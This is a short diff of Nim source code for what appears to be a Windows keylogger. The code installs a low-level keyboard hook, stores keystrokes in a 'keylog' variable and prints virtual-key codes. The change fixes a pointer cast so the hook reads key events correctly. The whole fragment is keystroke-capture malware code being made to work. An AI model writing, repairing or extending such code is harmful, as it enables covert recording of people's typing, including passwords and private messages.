@@ -7,7 +7,7 @@ var keylog: string = ""
 proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.stdcall.} =
   if (nCode == HC_ACTION):
 
-    let kbs: KBDLLHOOKSTRUCT = cast[KBDLLHOOKSTRUCT](lparam)
+    let kbs: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
 
     if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
       echo kbs.vkCode
